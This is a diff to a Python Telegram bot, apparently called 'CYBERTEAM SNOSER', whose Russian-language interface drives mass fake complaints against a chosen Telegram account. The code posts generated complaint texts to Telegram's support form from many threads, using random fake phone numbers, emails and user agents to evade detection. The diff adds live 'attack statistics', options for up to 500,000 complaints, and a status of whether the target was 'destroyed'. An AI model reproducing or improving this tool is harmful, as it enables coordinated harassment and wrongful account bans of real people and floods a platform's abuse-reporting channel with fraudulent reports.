@@ -6,11 +6,8 @@ import string
 import threading
 import subprocess
 import json
-import smtplib
 from datetime import datetime
 from concurrent.futures import ThreadPoolExecutor
-from email.mime.text import MIMEText
-from email.mime.multipart import MIMEMultipart
 from flask import Flask, request, jsonify
 
 # ===================================================================
@@ -26,7 +23,7 @@ app = Flask(__name__)
 
 @app.route('/')
 def home():
-    return "☢️ CYBERTEAM SNOSER v23.0 - MULTI CHANNEL"
+    return "☢️ CYBERTEAM SNOSER v24.0 - STATS EDITION"
 
 @app.route('/health')
 def health():
@@ -42,10 +39,10 @@ def install(package):
 
 def check_and_install_modules():
     print("=" * 60)
-    print("☢️ CYBERTEAM SNOSER v23.0 ☢️")
+    print("☢️ CYBERTEAM SNOSER v24.0 ☢️")
     print("=" * 60)
-    print("🔥 МНОГОКАНАЛЬНЫЙ СНОС")
-    print("📱 ЧЕРЕЗ ФОРМУ + НОМЕРА + ПОЧТЫ")
+    print("🔥 ЖИВАЯ СТАТИСТИКА")
+    print("💥 ДО 500.000 УДАРОВ")
     print("=" * 60)
     
     for module in required_modules:
@@ -211,113 +208,120 @@ class TextTemplates:
         return keyboard
 
 # ===================================================================
-# 💥 МНОГОКАНАЛЬНЫЙ СНОС
+# ГЛОБАЛЬНАЯ СТАТИСТИКА
 # ===================================================================
-class MultiChannelSnos:
+class AttackStats:
     
     @staticmethod
-    def send_via_form(target, reason, phone, email, text):
-        """Отправка через форму поддержки"""
+    def get_live_stats(target, reason, method, sent, success, failed, total):
+        """Возвращает живую статистику для бота"""
+        progress = int((sent / total) * 100) if total > 0 else 0
+        bar = "█" * int(progress / 2) + "░" * (50 - int(progress / 2))
+        
+        return f"""
+💥 <b>СТАТИСТИКА АТАКИ</b>
+
+🎯 ЦЕЛЬ: {target}
+🔥 ПРИЧИНА: {reason.upper()}
+📡 МЕТОД: {method.upper()}
+
+📊 ПРОГРЕСС: {progress}%
+[{bar}]
+
+📨 ОТПРАВЛЕНО: {sent:,}/{total:,}
+✅ УСПЕШНО: {success:,}
+❌ ОШИБОК: {failed:,}
+🎯 УСПЕШНОСТЬ: {int((success/sent)*100) if sent > 0 else 0}%
+
+⏱️ ВРЕМЯ: {datetime.now().strftime('%H:%M:%S')}
+"""
+    
+    @staticmethod
+    def get_final_stats(target, reason, method, sent, success, failed, total, destroyed):
+        status = "✅ УНИЧТОЖЕН" if destroyed else "❌ ВЫЖИЛ"
+        return f"""
+💥 <b>АТАКА ЗАВЕРШЕНА!</b>
+
+🎯 ЦЕЛЬ: {target}
+🔥 ПРИЧИНА: {reason.upper()}
+📡 МЕТОД: {method.upper()}
+
+📨 ВСЕГО: {sent:,}
+✅ УСПЕШНО: {success:,}
+❌ ОШИБОК: {failed:,}
+🎯 УСПЕШНОСТЬ: {int((success/sent)*100) if sent > 0 else 0}%
+
+💀 СТАТУС: {status}
+"""
+
+# ===================================================================
+# ОСНОВНОЙ ДВИЖОК СНОСА (С ЖИВОЙ СТАТИСТИКОЙ)
+# ===================================================================
+class SnosEngine:
+    
+    @staticmethod
+    def send_complaint(target, reason, method):
+        """Отправляет жалобу"""
+        text = TextTemplates.get_text(target, reason)
+        text += f" {Generators.user_agent()[:15]}"
+        
+        phone = Generators.phone()
+        email = Generators.email()
+        
         url = 'https://telegram.org/support'
         data = {'text': text, 'number': phone, 'email': email}
         headers = {'User-Agent': Generators.user_agent()}
         
         try:
             response = requests.post(url, headers=headers, data=data, timeout=CONFIG["request_timeout"])
-            return response.status_code == 200, response.status_code
+            return response.status_code == 200
         except:
-            return False, "Error"
+            return False
     
     @staticmethod
-    def send_via_phone(target, reason, phone, text):
-        """Отправка через номер телефона (имитация)"""
-        try:
-            # Формируем запрос через API
-            url = 'https://telegram.org/support'
-            data = {
-                'text': text,
-                'number': phone,
-                'email': f"user{random.randint(1,999)}@mail.ru"
-            }
-            headers = {'User-Agent': Generators.user_agent()}
-            response = requests.post(url, headers=headers, data=data, timeout=CONFIG["request_timeout"])
-            return response.status_code == 200, response.status_code
-        except:
-            return False, "Error"
-    
-    @staticmethod
-    def send_via_email(target, reason, email, text):
-        """Отправка через почту (имитация)"""
-        try:
-            url = 'https://telegram.org/support'
-            data = {
-                'text': text,
-                'number': f"+7{random.randint(1000000000, 9999999999)}",
-                'email': email
-            }
-            headers = {'User-Agent': Generators.user_agent()}
-            response = requests.post(url, headers=headers, data=data, timeout=CONFIG["request_timeout"])
-            return response.status_code == 200, response.status_code
-        except:
-            return False, "Error"
-    
-    @staticmethod
-    def multi_snos(target, reason, repeats, method="all"):
-        """
-        Многоканальный снос
-        method: "form" - только форма, "phone" - только номера, "email" - только почты, "all" - все вместе
-        """
+    def snos_target(target, reason, method, repeats, chat_id):
+        """Снос с живой статистикой"""
         success = 0
         failed = 0
         lock = threading.Lock()
         total = repeats
+        sent = 0
         
         print(f"\n🎯 ЦЕЛЬ: {target}")
         print(f"🔥 ПРИЧИНА: {reason.upper()}")
         print(f"📡 МЕТОД: {method.upper()}")
         print(f"💥 ЖАЛОБ: {total:,}")
-        print(f"🌊 ПОТОКОВ: {CONFIG['threads']}")
-        
-        text = TextTemplates.get_text(target, reason)
-        text += f" {Generators.user_agent()[:15]}"
         
         def worker(index):
-            nonlocal success, failed
-            
-            phone = Generators.phone()
-            email = Generators.email()
-            
-            if method == "form" or method == "all":
-                result, _ = MultiChannelSnos.send_via_form(target, reason, phone, email, text)
-            elif method == "phone":
-                result, _ = MultiChannelSnos.send_via_phone(target, reason, phone, text)
-            elif method == "email":
-                result, _ = MultiChannelSnos.send_via_email(target, reason, email, text)
-            else:
-                # Случайный метод
-                methods = ["form", "phone", "email"]
-                chosen = random.choice(methods)
-                if chosen == "form":
-                    result, _ = MultiChannelSnos.send_via_form(target, reason, phone, email, text)
-                elif chosen == "phone":
-                    result, _ = MultiChannelSnos.send_via_phone(target, reason, phone, text)
-                else:
-                    result, _ = MultiChannelSnos.send_via_email(target, reason, email, text)
+            nonlocal success, failed, sent
+            result = SnosEngine.send_complaint(target, reason, method)
             
             with lock:
+                sent += 1
                 if result:
                     success += 1
                 else:
                     failed += 1
+                
+                # Отправляем обновление статистики каждые 100 жалоб
+                if sent % 100 == 0 or sent == total:
+                    stats = AttackStats.get_live_stats(
+                        target, reason, method, sent, success, failed, total
+                    )
+                    send_telegram_message(chat_id, stats)
+            
             time.sleep(random.uniform(CONFIG["delay_min"], CONFIG["delay_max"]))
         
         with ThreadPoolExecutor(max_workers=CONFIG["threads"]) as executor:
             executor.map(worker, range(total))
         
-        print(f"✅ УСПЕШНО: {success:,}/{total:,}")
-        print(f"❌ ОШИБОК: {failed:,}/{total:,}")
-        
         is_destroyed = success > total * 0.6
+        
+        # Финальная статистика
+        final_stats = AttackStats.get_final_stats(
+            target, reason, method, sent, success, failed, total, is_destroyed
+        )
+        send_telegram_message(chat_id, final_stats)
         
         CONFIG['history'].append({
             'target': target,
@@ -396,7 +400,9 @@ def repeats_menu(target, reason, method):
         [{"text": "💥 1.000", "callback_data": f"run_{target}_{reason}_{method}_1000"}],
         [{"text": "💥 5.000", "callback_data": f"run_{target}_{reason}_{method}_5000"}],
         [{"text": "💥 10.000", "callback_data": f"run_{target}_{reason}_{method}_10000"}],
-        [{"text": "🔥 50.000", "callback_data": f"run_{target}_{reason}_{method}_50000"}],
+        [{"text": "💥 50.000", "callback_data": f"run_{target}_{reason}_{method}_50000"}],
+        [{"text": "💥 100.000", "callback_data": f"run_{target}_{reason}_{method}_100000"}],
+        [{"text": "🔥 500.000", "callback_data": f"run_{target}_{reason}_{method}_500000"}],
         [{"text": "⬅️ НАЗАД", "callback_data": f"back_method_{target}_{reason}"}]
     ]
 
@@ -462,12 +468,20 @@ def process_callback(chat_id, callback_data):
         total = len(CONFIG['history'])
         destroyed = sum(1 for h in CONFIG['history'] if h.get('destroyed', False))
         rate = int((destroyed / total) * 100) if total > 0 else 0
+        
+        # Считаем общее количество отправленных жалоб
+        total_sent = sum(h.get('total', 0) for h in CONFIG['history'])
+        total_success = sum(h.get('success', 0) for h in CONFIG['history'])
+        
         send_telegram_message(chat_id, f"""
-📊 СТАТИСТИКА
+📊 <b>ОБЩАЯ СТАТИСТИКА</b>
 
-📨 СНОСОВ: {total:,}
-💀 УНИЧТОЖЕНО: {destroyed:,}
-🎯 УСПЕШНОСТЬ: {rate}%
+📨 ВСЕГО СНОСОВ: {total:,}
+💥 ВСЕГО ЖАЛОБ: {total_sent:,}
+✅ УСПЕШНЫХ: {total_success:,}
+💀 УНИЧТОЖЕНО ЦЕЛЕЙ: {destroyed:,}
+🎯 ОБЩАЯ УСПЕШНОСТЬ: {rate}%
+
 ⚡ РЕЖИМ: {CONFIG['mode'].upper()}
 🌊 ПОТОКОВ: {CONFIG['threads']}
 """)
@@ -477,9 +491,9 @@ def process_callback(chat_id, callback_data):
         if not CONFIG['history']:
             send_telegram_message(chat_id, "📜 ИСТОРИЯ ПУСТА")
             return
-        msg = "📜 ПОСЛЕДНИЕ 10 СНОСОВ\n\n"
+        msg = "📜 <b>ПОСЛЕДНИЕ 10 СНОСОВ</b>\n\n"
         for i, h in enumerate(reversed(CONFIG['history'][-10:]), 1):
-            status = "✅" if h.get('destroyed', False) else "❌"
+            status = "✅ УНИЧТОЖЕН" if h.get('destroyed', False) else "❌ ВЫЖИЛ"
             msg += f"{i}. {h['target']} [{h.get('method', 'all')}] — {h['success']:,}/{h['total']:,} {status}\n"
         send_telegram_message(chat_id, msg)
         return
@@ -491,7 +505,7 @@ def process_callback(chat_id, callback_data):
         if not CONFIG['history']:
             send_telegram_message(chat_id, "📋 ЛОГИ ПУСТЫ")
             return
-        msg = "📋 ПОЛНЫЕ ЛОГИ\n\n"
+        msg = "📋 <b>ПОЛНЫЕ ЛОГИ</b>\n\n"
         for h in CONFIG['history'][-10:]:
             status = "✅ УНИЧТОЖЕН" if h.get('destroyed', False) else "❌ ВЫЖИЛ"
             msg += f"• {h['time']} | {h['target']} | {h.get('method', 'all')} | {h['success']:,}/{h['total']:,} | {status}\n"
@@ -540,10 +554,21 @@ def process_callback(chat_id, callback_data):
         CONFIG['attack_running'] = True
         CONFIG['current_target'] = target
         
-        send_telegram_message(chat_id, f"💥 СНОС ЗАПУЩЕН\n🎯 {target}\n🔥 {reason.upper()}\n📡 {method.upper()}\n💥 {repeats:,}")
+        # Отправляем стартовое сообщение
+        send_telegram_message(chat_id, f"""
+💥 <b>СНОС ЗАПУЩЕН!</b>
+
+🎯 ЦЕЛЬ: {target}
+🔥 ПРИЧИНА: {reason.upper()}
+📡 МЕТОД: {method.upper()}
+💥 ЖАЛОБ: {repeats:,}
+🌊 ПОТОКОВ: {CONFIG['threads']}
+
+⏳ ОТПРАВЛЯЮ...
+""")
         
         def run():
-            MultiChannelSnos.multi_snos(target, reason, repeats, method)
+            SnosEngine.snos_target(target, reason, method, repeats, chat_id)
             CONFIG['attack_running'] = False
         
         threading.Thread(target=run, daemon=True).start()
@@ -586,7 +611,8 @@ def process_text(chat_id, text):
 # ===================================================================
 def polling_bot():
     print("🤖 БОТ ЗАПУЩЕН")
-    print("📡 МНОГОКАНАЛЬНЫЙ РЕЖИМ")
+    print("📊 ЖИВАЯ СТАТИСТИКА ВКЛЮЧЕНА")
+    print("💥 ДО 500.000 УДАРОВ")
     
     while True:
         try:
@@ -630,14 +656,9 @@ def polling_bot():
 # ЗАПУСК
 # ===================================================================
 if __name__ == "__main__":
-    print("\n☢️ CYBERTEAM SNOSER v23.0")
-    print("📡 МНОГОКАНАЛЬНЫЙ СНОС")
-    print("=" * 60)
-    print("🔥 МЕТОДЫ СНОСА:")
-    print("  1. 🌐 ВСЕ МЕТОДЫ (форма + номера + почты)")
-    print("  2. 📝 ТОЛЬКО ФОРМА")
-    print("  3. 📱 ТОЛЬКО НОМЕРА")
-    print("  4. ✉️ ТОЛЬКО ПОЧТЫ")
+    print("\n☢️ CYBERTEAM SNOSER v24.0")
+    print("📊 ЖИВАЯ СТАТИСТИКА ВКЛЮЧЕНА")
+    print("💥 ДО 500.000 УДАРОВ")
     print("=" * 60)
     
     bot_thread = threading.Thread(target=polling_bot, daemon=True)
